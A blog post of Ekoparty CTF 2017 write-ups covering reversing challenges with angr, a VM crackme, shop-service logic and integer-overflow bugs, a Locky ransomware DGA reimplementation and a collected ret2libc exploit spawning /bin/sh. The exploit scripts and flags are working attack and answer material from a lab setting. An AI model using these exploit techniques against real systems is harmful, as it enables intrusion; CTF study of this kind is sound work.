---
layout: post
title: "Ekoparty CTF 2017 writeups"
date: 2017-09-17 00:00:00.000000000 +07:00
type: post
published: true
status: publish
categories:
- CTF
tags:
- ekoparty
- writeup
- solution
excerpt: "I solved some Ekoparty CTF 2017 challenges for fun and I'd like to share my solutions."
---

I solved some challenges for fun and I am an active team member of _[@PiggyBird](https://twitter.com/piggybirdctf)_ team. I'd like to share my solutions to the following challenges:
 * [warmup](#warmup)
 * [rhapsody](#rhapsody)
 * [EKOVM](#ekovm)
 * [Shopping](#shopping)
 * [Shopwn](#shopwn)
 * [Malbolge](#malbolge)
 * [LateRecon](#laterecon)
 * [Lucky](#lucky)

All challenges were solved by me. Thank for reading!

I also collect solutions from other teams on IRC:
 * [welcome](#welcome). Thank valis.
 * FirstAPP: http://myfirstapp.ctf.site:10080/index.php/getflag
 * [Tetrahedral](#tetrahedral). Thank hds
 * ekonews: http://ekonews.ctf.site:10080/news.cfm?news[]=2675 . Thank hds.
 * NonStop: http://h20566.www2.hpe.com/hpsc/doc/public/display?sp4ts.oid=4201434&docLocale=en_US&docId=emr_na-c02131267 . Thank hds.
 * https://secure.mydns.webcam:35283/ . Thank hds.
 * Spies:  http://supercam.mydns.webcam and http://greenhouse.mydns.webcam . Thank hds.

## warmup
Flag: _EKO{1s_th1s_ju5t_4_w4rm_up?}_

This is an ELF 64bit file. The program reads a string from console and compare it with hardcoded string. The comparison function is located at 0x4009D8. You can use IDA with Hexray to decompile the function and find flag by hand. Because I am too lazy, I use [angr](http://angr.io/) to solve. It takes 4s to run on my laptop.

``` python
#!/usr/bin/env python
import angr
# load the binary into an angr project
p = angr.Project("./warmup")
state = p.factory.blank_state(addr=0x4009D8)
flag_len = 0x6CCD7C-0x6CCD60
input=state.se.BVS('input', flag_len * 8)
for i in xrange(flag_len):
    state.add_constraints(input.get_byte(i) >= 0x20)
    state.add_constraints(input.get_byte(i) <= 0x7D)

state.memory.store(0x6CCD60, input)
path = p.factory.path(state=state)
ex = p.surveyors.Explorer( start=path, find=(0x400C6C), )
ex.run()
found_state = ex.found[0].state
print found_state.se.any_str(input) # EKO{1s_th1s_ju5t_4_w4rm_up?}
```

## rhapsody
Flag: _EKO{1sth1sr34lfl4g0rjus7f4n74s34}_

This challenge is very similar to `warmup`. The author adds an useless function, for example:

``` c
__int64 __fastcall sub_400C80(__int64 a1, __int64 a2)
{
  __int64 result; // rax@2

  byte_6CEE20 = sub_4009D3(a1, a2); // VERY VERY useless function
  if ( unk_6CEE41 == aK[0] )
  {
    dword_6CDC70 ^= 5u;
    result = (unsigned int)dword_6CDC70;
  }
  else
  {
    result = 0LL;
  }
  return result;
}
```

`sub_4009D3` makes angr be hard to solve. I patch it with `xor rax,rax;ret`. Everything becomes clearly. I edit the earlier script to solve this task. It takes 10s to run on my laptop.

``` python
#!/usr/bin/env python
# patch 0x4009D3 : xor rax,rax;ret = [ 48 31 c0 c3 ]
# we don't need this function.
# we can use hook() from angr but it's very slow.
import angr

p = angr.Project("./rhapsody1.patched")
state = p.factory.blank_state(addr=0x401378)
flag_len = 0x6CEE61-0x6CEE40
input=state.se.BVS('input', flag_len * 8)
for i in xrange(flag_len):
    state.add_constraints(input.get_byte(i) >= 0x20)
    state.add_constraints(input.get_byte(i) <= 0x7D)

state.memory.store(0x6CEE40, input)
path = p.factory.path(state=state)
ex = p.surveyors.Explorer( start=path, find=(0x401694), )
ex.run()
found_state = ex.found[0].state
print found_state.se.any_str(input) # EKO{1sth1sr34lfl4g0rjus7f4n74s34}
```

## EKOVM
Flag: _EKO{s1Mpl3-vm}_

This challenge is harder: a VM challenge. To understand this CTF challenge style, please read: [VM challenges in CTF  - BreakIn CTF](https://threads-iiith.quora.com/VM-challenges-in-CTF-BreakIn-CTF).

Author implements a virtual CPU with many instructions. I try to understand this VM structure. By reading some functions, I can names them and build a structure of VM.

``` c
signed __int64 sub_12D0()
{
  VM_STATE *v0; // rax@1
  VM_STATE *v1; // rbx@2
  signed __int64 result; // rax@4

  v0 = vm_init((unsigned __int8 *)&bytecode, 232u);
  if ( v0 )
  {
    v1 = v0;
    v0->ins[0xC0] = (__int64)vm_read_flag;
    v0->ins[0xD3] = (__int64)vm_secure_flag;
    vm_run(v0);
    if ( getenv("MAGICVAR") )
      sub_FD0((__int64)v1);
    vm_cleanup(v1);
    result = 0LL;
  }
  else
  {
    puts("Failed to create virtual machine instance.");
    result = 1LL;
  }
  return result;
}
```

Let's examine `vm_init`. This function allocates a memory region to store states of VM. The size of the region is 0x1918. After that, this function initializes some registers, such as: program counter register(pc), flags. It also allocates memory and copies all VM bytecode to VM_STATE. And then, `sub_48A0` is called to initialize all VM instructions. 

``` c
_int64 (__fastcall *__fastcall sub_48A0(VM_STATE *a1))()
{
  unsigned int v1; // eax@1
  VM_STATE *v2; // rax@1
  __int64 (__fastcall *result)(); // rax@3

  v1 = time(0LL);
  srand(v1);
  v2 = (VM_STATE *)((char *)a1 + 272);
  do
  {
    v2->field_0 = (__int64)sub_1450;
    v2 = (VM_STATE *)((char *)v2 + 8);
  }
  while ( (__int64 *)v2 != a1->field_910 );
  a1->ins[0] = (__int64)sub_1350;
  a1->ins[1] = (__int64)sub_27F0;
  a1->ins[2] = (__int64)sub_1540;
  a1->ins[3] = (__int64)sub_3C40;
  a1->ins[4] = (__int64)sub_3D60;
  a1->ins[0x10] = (__int64)sub_17A0;
  a1->ins[0x12] = (__int64)sub_1930;
  a1->ins[0x11] = (__int64)sub_1860;
  a1->ins[0x21] = (__int64)sub_2960;
  a1->ins[0x27] = (__int64)sub_2BD0;
  a1->ins[0x22] = (__int64)sub_2E40;
  a1->ins[0x23] = (__int64)sub_30B0;
  a1->ins[0x24] = (__int64)sub_2570;
  a1->ins[0x20] = (__int64)sub_3320;
  a1->ins[0x28] = (__int64)sub_3590;
  a1->ins[0x25] = (__int64)sub_1A00;
  a1->ins[0x26] = (__int64)sub_1B10;
  a1->ins[0x30] = (__int64)sub_4640;
  a1->ins[0x31] = (__int64)sub_1670;
  a1->ins[0x32] = (__int64)sub_3E70;
  a1->ins[0x33] = (__int64)sub_4120;
  a1->ins[0x34] = (__int64)sub_4230;
  a1->ins[0x40] = (__int64)sub_4340;
  a1->ins[0x41] = (__int64)sub_1C20;
  a1->ins[0x42] = (__int64)sub_4740;
  a1->ins[0x43] = (__int64)sub_1DA0;
  a1->ins[0x44] = (__int64)sub_1E50;
  a1->ins[0x50] = (__int64)sub_1490;
  a1->ins[0x51] = (__int64)sub_3AD0;
  a1->ins[0x60] = (__int64)sub_3800;
  a1->ins[0x61] = (__int64)sub_1F00;
  a1->ins[0x62] = (__int64)sub_20F0;
  a1->ins[0x70] = (__int64)sub_2460;
  a1->ins[0x71] = (__int64)sub_39A0;
  a1->ins[0x72] = (__int64)sub_14C0;
  result = sub_1370;
  a1->ins[0x73] = (__int64)sub_1370;
  return result;
}
```

Let's check `vm_run` (0x10D0). Pseudo-code:
``` c
void __fastcall vm_run(VM_STATE *s)
{
  unsigned int v1; // er12@2
  __int16 i; // ax@2
  __int64 opcode; // rbp@7
  void (__fastcall *ins)(VM_STATE *); // rax@9
  __int64 v6; // rcx@12
  const char *v7; // rsi@2

  if ( s )
  {
    s->pc = 0;
    v7 = 0LL;
    v1 = 0;
    for ( i = s->field_1914; i == 1; i = s->field_1914 )
    {
      if ( (unsigned int)s->pc > 0xFFFE )
      {
        s->pc = 0;
      }
      opcode = s->memory[s->pc];                   // fetch opcode
      if ( getenv("MAGICVAR") )
      {
        v7 = "%04x - Parsing OpCode Hex:%02X\n";
        _printf_chk(1LL, "%04x - Parsing OpCode Hex:%02X\n", s->pc, (unsigned int)opcode);
      }
      ins = (void (__fastcall *)(VM_STATE *))s->ins[opcode];
      if ( ins )
        ins(s); // run instruction
      ++v1;
    }
    if ( getenv("MAGICVAR") )
      _printf_chk(1LL, "Executed %u instructions\n", v1, v6);
  }
}
```
 
I create a structure called VM_STATE. 

```
VM_STATE        struc ; (sizeof=0x1918, mappedto_1)
00000000 field_0         dq ?
00000008 field_8         dq ?
00000010 field_10        dd ?
00000014 field_14        dw ?
00000016 field_16        dw ?
00000018 field_18        dq ?
00000020 field_20        dq ?
00000028 field_28        dq ?
00000030 field_30        dq ?
00000038 field_38        dq ?
00000040 field_40        dq ?
00000048 field_48        dq ?
00000050 field_50        dq ?
00000058 field_58        dq ?
00000060 field_60        dq ?
00000068 field_68        dq ?
00000070 field_70        dq ?
00000078 field_78        dq ?
00000080 field_80        dq ?
00000088 field_88        dq ?
00000090 field_90        dq ?
00000098 field_98        dq ?
000000A0 field_A0        dq ?
000000A8 field_A8        dd ?  ; secret value
000000AC field_AC        dd ?
000000B0 field_B0        dq ?
000000B8 field_B8        dq ?
000000C0 field_C0        dq ?
000000C8 field_C8        dq ?
000000D0 field_D0        dq ?
000000D8 flag            dq ?                    ; offset
000000E0 field_E0        dq ?
000000E8 has_flag        dd ?
000000EC field_EC        dd ?
000000F0 field_F0        dw ?
000000F2 field_F2        dw ?
000000F4 pc              dd ?
000000F8 memory          dq ?                    ; offset
00000100 field_100       dd ?
00000104 field_104       dd ?
00000108 field_108       dq ?
00000110 ins             dq 256 dup(?)
00000910 field_910       dq 511 dup(?)
00001908 field_1908      dq ?
00001910 field_1910      dd ?
00001914 field_1914      dw ?
00001916 field_1916      dw ?
VM_STATE        ends
```


There is a _magic_ environment variable called `MAGICVAR`. The program will print out every instructions when `MAGICVAR` is set. It is very useful and we don't need to write a disassembler by ourselves. There are 02 instructions that we need to know: `vm_read_flag` (OpCode Hex:C0) and `vm_secure_flag` (OpCode Hex:D3).

`vm_read_flag` reads a string from console and store it into `VM_STATE::flag`. 

`vm_secure_flag` reads flag from `VM_STATE::flag` and multiples each character in flag by `VM_STATE::field_A8`. This value is calculated during VM bytecode is executed. This value is not unique. I run ekovm and type `123456` as flag twice. With the same flag, the results did not match my expectations. I know the first character of flag is `E`. I need to know the secret value: `VM_STATE::field_A8`.
``` python
a= ['064325164','070762714','074006534','135340214','127270554','045162244','072374624','125051700','122026060','046574154','042136424','131507430','122633024','136752124','007461350']
secret = int(a[0], 8) / ord('E')
print ''.join(chr(int(x, 8)/secret) for x in a)
```

It is very annoyed that they give us a picture. I found a nice and simple OCR online service to convert picture to text: https://www.onlineocr.net/


## Shopping
Flag: _EKO{d0_y0u_even_m4th?}_

This challenge is simple. You have 50 coins to buy something. The remain coins are calculated by this formula:

`remain = 50 - number_of_items * item_price`

you may provide a negative number_of_items to increase your coins.

``` python
from pwn import *
import hashlib
HOST = 'shopping.ctf.site'
PORT = 21111
conn = remote(HOST,PORT)
print conn.recvuntil("Enter a raw string (max. 32 bytes) that meets the following condition: hex(sha1(input))[0:6] == ")
proof = conn.recvuntil('\n')
proof = proof.strip()
i = 0
while True:
    h = hashlib.sha1()
    h.update(str(i))
    digest = h.hexdigest()
    if digest[0:6] == proof:
        conn.send(str(i)+'\n')
        break
    i += 1

print conn.recvuntil('?')
conn.send('2\n')
print conn.recvuntil('?')
conn.send('-100000000\n')
print conn.recvuntil('?')
conn.send('4\n')
print conn.recvuntil('?')
conn.send('1\n')
conn.interactive()
```

## Shopwn
Flag: _EKO{dude_where_is_my_leak?}_

This challenge is similar to previous one. They fix something in code and we can not input a negative value. I think about integer overflow. 
``` python
from pwn import *
import hashlib
HOST = 'shopping.ctf.site'
PORT = 22222
conn = remote(HOST,PORT)
print conn.recvuntil("Enter a raw string (max. 32 bytes) that meets the following condition: hex(sha1(input))[0:6] == ")
proof = conn.recvuntil('\n')
proof = proof.strip()
i = 0
while True:
    h = hashlib.sha1()
    h.update(str(i))
    digest = h.hexdigest()
    if digest[0:6] == proof:
        conn.send(str(i)+'\n')
        break
    i += 1

print conn.recvuntil('?')
conn.send('2\n')
print conn.recvuntil('?')
conn.send('419496729\n') # 419496729 * 20 = 8389934580 = 0x1F4143DF4 --> integer overflow --> 0xF4143DF4 = -200000012
print conn.recvuntil('?')
conn.send('4\n')
print conn.recvuntil('?')
conn.send('1\n')
conn.interactive()
```

## Malbolge
Flag: _EKO{0nly4nother3soteric1anguage}_

An esoteric programming language: [Malbolge](https://en.wikipedia.org/wiki/Malbolge)

Another source of esolang here: https://hub.docker.com/r/hakatashi/esolang-box/ 

```
nc malbolge.ctf.site 40111
Send a malbolge code that print: 'Welcome to EKOPARTY!' (without single quotes)
```

I found and very simple and nice Malbolge tool on internet:  http://zb3.me/malbolge-tools/#generator

I just input the following string and get flag. Nothing to do.
```
D'`_q^8J}l{jWx6SARQP*NLn&%7ZFXDgUAzy>P<{)9[Zp6WVlqpih.ONjiha'H^]\[Z~^W\[ZYRvVOTSLp3INGFjJ,BAe?'=<;_?8=<;4X216543,P0p(-,+*#G'&f|{"y?}|ut:[qvutml2poQPlejc)gfedFb[!_X]V[ZSRvP8TSLpJ2NMLEDhU
```

## LateRecon

Just join IRC channel ##ekoctf on freenode.net and look into topic: _EKO{C4tch_M3_If_Y0u_C4n?}_

## Lucky
The file is Locky ransomware sample. There are many articles and blogs that write about this ransomware. This ransomware is implemented a domain generator algorithm (DGA). 06 domain names are generated by date, month and year.
 
https://blogs.forcepoint.com/security-labs/locky-ransomware-encrypts-documents-databases-code-bitcoin-wallets-and-more

Luckily, I found [locky-dga.c](https://gist.github.com/syzdek/8a0fd7353a643abfc275). Thank [syzdek](https://gist.github.com/syzdek). 

The author of this challenge  provided a modified version of the malware. I found the DGA implementation at 0x406588. They change `modConst1` from `0xB11924E1` to `0x37333331` and append `.mydns.webcam` to new generated string.

``` c
// for EKOPARTY CTF 2017
char * lockydga(unsigned int seed, struct tm * st)
{
   int32_t    modConst1 = 0x37333331;
   int32_t    modConst2 = 0x27100001;
   int32_t    modConst3 = 0x2709A354;
   int32_t    modYear;
   int32_t    modMonth;
   int32_t    modDay;
   int32_t    modBase = 0;
   int32_t    i = 0i;
   int32_t    genLength = 0;
   uint32_t   x = 0;
   uint32_t   y = 0;
   uint32_t   z = 0;
   uint32_t   modFinal = 0;
   char     * domain;
   char       tldchars[29] = "rupweuinytpmusfrdeitbeuknltf";
  
   // Perform some shifts with the constants
   modYear  = rotr32(modConst1 * (st->tm_year + 1234 + 1900), 5);
   modDay   = rotr32(modConst1 * (modYear + (st->tm_mday >> 1) + modConst2), 5);
   modMonth = rotr32(modConst1 * (modDay + st->tm_mon + modConst3 + 1), 5);
   modBase  = rotl32(seed % 6, 21);
   modFinal = rotr32(modConst1 * (modMonth + modBase + modConst2), 5);
   modFinal += 0x27100001;
  
   // Length without TLD
   genLength = modFinal % 11 + 5;
  
   if (genLength == 0)
      return(NULL);

   // Allocate full length including TLD and null terminator
   if ((domain = (char *)malloc(modFinal % 11 + 8 + 15)) == NULL)
   {
      perror("malloc()");
      return(NULL);
   };
  
   // Generate domain string before TLD
   do
   {
      x = rotl32(modFinal, i);
      y = rotr32(modConst1 * x, 5);
      z = y + modConst2;
      modFinal = z;
      domain[i++] = z % 25 + 97;
   }
   while (i < genLength);
 
   strcpy(&domain[i], ".mydns.webcam");
   return domain;
}
```
We need to know: **What is  the infection date?** I can not find the correct date and I don't have the flag. Poor me!

## Welcome
check init code, setvbuf was called setting stdin buffer to an arbitrary stack location. if you got deep enough with recursion this buffer will clash with your stack frame.


source: https://gist.github.com/anonymous/99aaebb12468c7cc8b8b08da27d37918

``` python
from pwn import *

r = remote("localhost", 11111)

libc = ELF("/lib32/libc.so.6")

r.sendlineafter("Option: ", "1")
r.sendafter("to encrypt: ", "a" * 0x100)
r.recvuntil("encrypt is: ")
leak = r.recv(0x100)

leak2 = ""
for c in leak:
    leak2 += chr(ord(c) ^ 0xde)

libc_base = u32(leak2[4:8]) - 1781159 + 8192
bin_base = u32(leak2[0x60:0x64]) - 12188
stack = u32(leak2[0x50:0x54])

info("libc: 0x%x" % libc_base)
info("bin: 0x%x" % bin_base)
info("stack: 0x%x" % stack)

for i in xrange(0, 128):
    r.sendlineafter("Option: ", "4")

r.sendlineafter("Option: ", "1")

payload = fit({8: [
# ebx
    bin_base + 12188,
# ebp
    0xcafebabe,
# system
    libc_base + libc.symbols['system'],
# exit
    bin_base + 0x690,
    libc_base + libc.vaddr_to_offset(next(libc.search('/bin/sh')))
]})

r.sendafter("to encrypt: ", payload.ljust(0x100))
r.interactive()
```

## Tetrahedral
Source: https://paste.null-life.com/#/I5i06aW41akST5LNfjzc0YCoj7i4EnsaADKi5/QZAtCui9wcaaFIbqw0

``` php
<?php

$hex = hex2bin('00030003000304280B7F81FF0001710100980ABA08BE0ABA08BE0ABA08BE0ABA08BE710500980AC008DE0AC008DE0AC008DE0AC008DE710900980A4908AD0AD308DD0AD608AB0AD708A8710D00987101009C7105009C00A07109009C00A0710D009C00A0711100980A64080A0ABE08940A58083D0A5508D571150098800080070A8C08270ACE08777119009880BC0A61084E00B5711D009880D70A41087A0A4308F00ACA08EA712100987115009C7119009C29FF711D009CA9FB00A229DBA9FF00A17121009C00A071250098000229C9AE00');

for ($i = 0; $i < strlen($hex); $i += 2) {
    $opcode = substr($hex, $i, 2);
    $opcode = unpack('n', $opcode)[1];
    $opcode = sprintf("%06o", $opcode);
    
    $partial = substr($opcode, 0, 3);
    $value = sprintf('%02x', octdec(substr($opcode, 3)));
    
    $found = true;
    $op = '';
    switch ($opcode) {
        case '000265':
            $op = 'CDQ';
            break;
        case '000242':
            $op = 'QMPY';
            break;
        case '000241':
            $op = 'QSUB';
            break;
        case '000240':
            $op = 'QADD';
            break;
        case '000234':
            $op = 'QLD';
            break;
        case '000230':
            $op = 'QST';
            break;
        case '000003':
            $op = 'ONED';
            break;
        case '000002':
            $op = 'ZERD';
            break;
        case '000001':
            $op = 'MOND';
            break;
        default:
            $found = false;
    }
    
    if (!$found) {
        switch ($partial) {
            case '124':
                $op = "POP $value";
                break;
            case '070':
                $op = "LADR L+$value";
                break;
            case '024':
                $op = "PUSH $value";
                break;
            case '005':
                $op = "LDLI $value";
                break;
            case '004':
                $op = "ORRI $value";
                break;
            case '002':
                $op = "ADDS  $value";
                break;
            case '100':
                $op = "LDI  $value";
                break;
        }
    }
    
    if ($op) {
        echo "$op\n";
    } else {
        echo "$opcode\n";
    }
}
```